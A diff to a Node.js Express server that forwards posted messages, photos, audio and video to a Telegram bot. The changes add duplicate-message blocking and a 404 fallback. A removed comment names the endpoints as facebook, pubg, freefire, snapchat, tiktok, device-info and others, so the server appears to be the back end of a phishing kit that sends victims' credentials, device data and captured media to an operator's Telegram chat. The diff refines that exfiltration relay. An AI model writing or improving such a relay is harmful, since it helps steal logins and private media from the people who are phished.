@@ -7,9 +7,10 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
-
-// تقديم ملفات HTML من public/
 app.use(express.static(path.join(__dirname, 'public')));
+
+// ============ منع التكرار ============
+const sentCache = new Set();
 
 // ============ Helper ============
 function base64ToBlob(base64, mime) {
@@ -22,7 +23,6 @@ function base64ToBlob(base64, mime) {
 }
 
 // ============ الراوتر الرئيسي ============
-// كل مسارات /.netlify/functions/* و /api/* هتوصل هنا
 app.post(['/.netlify/functions/:fn', '/api/:fn'], async (req, res) => {
   if (!BOT_TOKEN) {
     return res.status(500).json({ success: false, error: "Bot token not configured" });
@@ -31,13 +31,10 @@ app.post(['/.netlify/functions/:fn', '/api/:fn'], async (req, res) => {
   const fn = req.params.fn.toLowerCase();
   const body = req.body || {};
 
-  // تحديد نوع العملية من اسم الملف
   let action = 'message';
   if (fn === 'send-audio') action = 'audio';
   else if (fn === 'send-photo' || fn === 'upload-photos') action = 'photo';
   else if (fn === 'send-video') action = 'video';
-  // الباقي (device-info, facebook, freefire, internet, pubg,
-  // send-message, snapchat, tiktok, telegram, sendTelegram) = message
 
   try {
     // ============ 1) رسالة ============
@@ -48,6 +45,16 @@ app.post(['/.netlify/functions/:fn', '/api/:fn'], async (req, res) => {
       if (!chatId || !finalMessage) {
         return res.status(400).json({ success: false, error: "Missing chatId or message/text" });
       }
+
+      // ⬇️⬇️⬇️ منع التكرار ⬇️⬇️⬇️
+      const key = `${chatId}_${finalMessage.length}_${finalMessage.slice(0, 50)}`;
+      if (sentCache.has(key)) {
+        console.log('[DUPLICATE BLOCKED]');
+        return res.json({ success: true, duplicate: true });
+      }
+      sentCache.add(key);
+      setTimeout(() => sentCache.delete(key), 10000);
+      // ⬆️⬆️⬆️ منع التكرار ⬆️⬆️⬆️
 
       const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -183,9 +190,9 @@ app.post(['/.netlify/functions/:fn', '/api/:fn'], async (req, res) => {
   }
 });
 
-// ============ Fallback: أي مسار غير معروف → index.html ============
+// Fallback
 app.use((req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+  res.status(404).json({ success: false, error: "Not found" });
 });
 
 app.listen(PORT, () => {
